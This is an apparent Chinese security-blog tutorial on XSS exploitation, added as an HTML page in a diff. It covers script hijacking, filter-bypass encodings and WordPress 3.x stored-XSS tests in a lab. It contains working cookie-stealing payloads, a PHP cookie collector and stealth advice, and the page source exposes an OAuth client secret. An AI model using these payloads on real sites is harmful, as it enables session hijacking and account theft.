@@ -1,0 +1,95 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="XSS高级利用"><meta name="keywords" content><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>XSS高级利用 | J0k3r</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitment/style/default.min.css"><script src="https://cdn.jsdelivr.net/npm/gitment/dist/gitment.browser.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">33</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">24</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="https://bossgirl.github.io/">八千国家奖学金</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://dxxblog.top/">xx_C1</a><a class="author-info-links__name text-center" href="http://www.cooper111.xyz/">花郎世纪</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><nav id="nav" style="background-image: url(https://i.loli.net/2019/07/31/5d41a1019cdd085371.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about/">关于</a></span></div><div id="site-info"><div id="site-title">J0k3r</div><div id="site-sub-title"></div><div id="site-social-icons"><a class="social-icon" href="https://github.com/zhuxianjin"><i class="fa-github fa"></i></a><a class="social-icon" href="mailto:xavier.chu@foxmail.com"><i class="fa-envelope fa"></i></a><a class="social-icon" href="http://j0k3r.top/atom.xml"><i class="fa-rss fa"></i></a><a class="social-icon" href="http://t.cn/ExVP77H"><i class="fa-qq fa"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=375588920"><i class="fa-music fa"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><article id="page"><h1>XSS高级利用</h1><div class="article-container"><p>点击阅读</p>
+<a id="more"></a>
+<h5 id="利用xss的javascript劫持"><a href="#利用xss的javascript劫持" class="headerlink" title="利用xss的javascript劫持"></a>利用xss的javascript劫持</h5><p>一个xss漏洞示例页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;  </span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;xss&quot;/&gt;  </span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;test&quot;/&gt;  </span><br><span class="line">&lt;/form&gt;  </span><br><span class="line">&lt;?php  </span><br><span class="line">    $xss = @$_GET[&apos;xss&apos;];  </span><br><span class="line">    if($xss!==null)&#123;  </span><br><span class="line">        echo $xss;  </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这段代码中首先包含一个表单，用于向页面自己发送GET请求，带一个名为xss的参数。 然后PHP会读取该参数，如果不为空，则直接打印出来，这里不存在任何过滤。也就是说，如果xss中存在HTML结构性的内容，打印之后会直接解释为HTML元素</p>
+</blockquote>
+<p>例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Javascript Hijack with XSS&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://118.25.0.196/script.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php echo $_GET[&quot;xss&quot;]; ?&gt;</span><br><span class="line">&lt;input type=&quot;Submit&quot; onClick=&quot;javascript:Hello()&quot; value=&quot;Say Hello&quot; /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>script.js内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function Hello()</span><br><span class="line">&#123;</span><br><span class="line">alert(&quot;hi&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当传入xss为<br><code>xss=&lt;script&gt;function Hello() { alert(&quot;hacked&quot;); } &lt;/script&gt;</code>时</p>
+<p>鼠标点击会弹出hacked而非预定的hi</p>
+<p>这里利用xss漏洞劫持javascript代码</p>
+<p>可以传入<code>&lt;script type=&quot;text/javascript&quot; src=&quot;http://[evil server]/hack.js&quot;&gt;&lt;/script&gt;</code>以执行较长的代码</p>
+<h5 id="XSS会话劫持"><a href="#XSS会话劫持" class="headerlink" title="XSS会话劫持"></a>XSS会话劫持</h5><p>可以在含xss漏洞的地方使用以下类似代码盗取cookie</p>
+<p><code>&lt;script&gt;window.open(&quot;http://x.x.x.x/getcookie.php?cookie=&quot;+document.cookie)&lt;/script&gt;</code></p>
+<p>或</p>
+<p><code>&lt;script&gt; document.location=&quot;http://x.x.x.x/getcookie.php?cookie=&quot;+document.cookie; &lt;/script&gt;</code></p>
+<p>getcookie.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie=@$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$path=<span class="string">"./cookies.txt"</span>;</span><br><span class="line">file_put_contents($path,$cookie.PHP_EOL, FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>为防止察觉，使用javascript</p>
+<p><code>&lt;script src=http://x.x.x.x/script.js &gt;&lt;/script&gt;</code></p>
+<p>script.js:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var script =document.createElement(&apos;script&apos;);</span><br><span class="line">script.src=&apos;http://x.x.x.x/getcookie.php?cookie=&apos;+escape(document.cookie);</span><br><span class="line">document.body.appendChild(script);</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9a7a0e2f9.png" alt="s4.png"></p>
+<h5 id="xss常用的编码"><a href="#xss常用的编码" class="headerlink" title="xss常用的编码"></a>xss常用的编码</h5><p>bWAPP中的XSS - Reflected (AJAX/XML)</p>
+<p>输入 <code>&amp;lt;img src=1 onerror=&quot;alert(document.cookie)&quot;&amp;gt;</code><br>弹窗获取cookie</p>
+<p><code>&amp;lt;</code>、<code>&amp;gt;</code>分别为<code>&lt;</code>、<code>&gt;</code>的HTML tag</p>
+<p>第一个，html实体编码，例如：</p>
+<p><code>&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x29;</code></p>
+<p>第二个，进制类，例如：</p>
+<p><code>\x61\x6c\x65\x72\x74\x60\x78\x73\x73\x60</code></p>
+<p>某些时候，也有不带x,例如：<code>\5c\6a</code></p>
+<p>第三个，Unicode，例如：</p>
+<p><code>\u0061\u006c\u0065\u0072\u0074\u0060\u4e2d\u6587\u4e5f\u53ef\u4ee5\u0060</code></p>
+<p>第四个，纯转义，例如：</p>
+<p><code>\&#39;   \&quot;   \&lt;   \&gt;</code></p>
+<p>这样的在特殊字符前加\进行转义。</p>
+<p>html标签中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">html中当然会支持html实体编码，例如&amp;#61，也有&amp;lt;</span><br><span class="line">支持十六进制，但是要以&amp;#x开头，其中x大写小写无所谓。</span><br><span class="line">支持十进制，要以&amp;#开头，注意，没有x哦。</span><br><span class="line">支持数字部分高位补充0，例如&amp;#00000000061，&amp;#61这两是一样的。</span><br><span class="line">可能你已经发现了，后缀有没有;  都无所谓</span><br></pre></td></tr></table></figure>
+<p>javascript中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval函数里，支持十六进制，但是要以 \x 开头，x只能小写！必须两位，例如：\x5c</span><br><span class="line">eval函数里，支持八进制，但是要以 \ 开头。必须两位，例如：\134</span><br><span class="line">eval函数里，还支持\u前缀的unicode，本质是：16进制的ascii码。必须是四位，例如：\u005c</span><br></pre></td></tr></table></figure>
+<h5 id="WordPress-XSS-漏洞"><a href="#WordPress-XSS-漏洞" class="headerlink" title="WordPress XSS 漏洞"></a>WordPress XSS 漏洞</h5><p><a href="http://bobao.360.cn/learning/detail/112.html" target="_blank" rel="noopener">WordPress 3.0-3.92 存储型XSS添加管理员&amp;getshell脚本
+</a></p>
+<p>于是下载了wordpress-3.8.3在虚拟机测试</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9a7a78778.png" alt="s12.png"></p>
+<p>发现管理员登陆时，编辑内容并不会被过滤</p>
+<p>编辑文章，回到首页查看</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9a7a04650.png" alt="s8.png"></p>
+<p>但是chrome下弹出的cookie似乎被过滤了，最关键的部分并没有，利用js在服务器上获取的cookie同样不完整</p>
+<p>firefox下却没问题</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9a7a7a1bb.png" alt="s17.png"></p>
+<p>以下两个地方都被插入了代码，也会弹出两次</p>
+<p>标题<br><img src="https://i.loli.net/2018/07/29/5b5d9ac65b24b.png" alt="s5.png"><br>侧栏</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9ac65c9f6.png" alt="s6.png"></p>
+<p>去官网下了个最新版WordPress</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9ac6c3a0a.png" alt="s11.png"></p>
+<p>管理员的编辑仍不会被过滤</p>
+<p>接收到cookie</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9ac706204.png" alt="s162.png"></p>
+<p>wordpress站点有多个用户，当不是管理员时</p>
+<p>在<a href="https://www.secpulse.com/archives/2365.html" target="_blank" rel="noopener">WordPress 3.0-3.9.2 XSS 漏洞详细分析</a>看到</p>
+<p>漏洞的成因是在/wp-includes/formatting.php中的wptexturize函数</p>
+<p>formatting.php应该是用于清理XHTML和用特定字符集正确格式化文本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function wptexturize($text) &#123;</span><br><span class="line"></span><br><span class="line">	......</span><br><span class="line"></span><br><span class="line">	$textarr = preg_split(&apos;/(&lt;.*&gt;|\[.*\])/Us&apos;, $text, -1, PREG_SPLIT_DELIM_CAPTURE);</span><br><span class="line">	</span><br><span class="line">	foreach ( $textarr as &amp;$curl ) &#123;</span><br><span class="line">	</span><br><span class="line">	......</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">	return implode( &apos;&apos;, $textarr );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的正则<code>/(&lt;.*&gt;|\[.*\])/Us</code>会匹配</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//这个新姿势能在前台xss弹窗 不限制用户权限 后台的确不能弹窗</span><br><span class="line"></span><br><span class="line">[&lt;a href=&quot;hello&quot; alt=&quot;]&quot;&gt;&lt;/a&gt;[&quot;&lt;script&gt;&lt;/][a&gt;&lt;script&gt;alert(1)&lt;/script&gt;]</span><br><span class="line"></span><br><span class="line">前后台都能弹窗 似乎还是老的onmouseover能用</span><br><span class="line"></span><br><span class="line">[&lt;a href=&quot;test&quot; title=&quot;]&quot;&gt;&lt;/a&gt;[&quot; &lt;!-- onmouseover=alert(/xss/)//&gt;&lt;!-- --&gt;NOT VULNERABLE&lt;a&gt;&lt;/a&gt;]</span><br></pre></td></tr></table></figure>
+<p>然而我发现这payload没什么效果，有时间再好好看看，完善一下</p>
+<p>下图搬运于<a href="https://github.com/ch3nw3i/XSS" target="_blank" rel="noopener">GitHub - ch3nw3i/XSS: 跨站脚本攻击</a></p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9b114b128.png" alt="xss-1.png"></p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9b11a8825.jpg" alt="xss-3.jpg"></p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9b19d2ac8.png" alt="xss-2.png"></p>
+</div></article><nav id="pagination"><div class="pagination"></div></nav><div id="gitment-container"></div><script>var gitment = new Gitment({
+  id: md5(decodeURI(location.pathname)),
+  owner: 'zhuxianjin',
+  repo: 'zhuxianjin.github.io',
+  oauth: {
+    client_id: '7b59169c6ede61f26021',
+    client_secret: 'ab44e9406b9214e664d133180ad8e54f696d169d'
+  }
+})
+gitment.render('gitment-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2019/07/31/5d41a1019cdd085371.png)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+}</script></body></html>
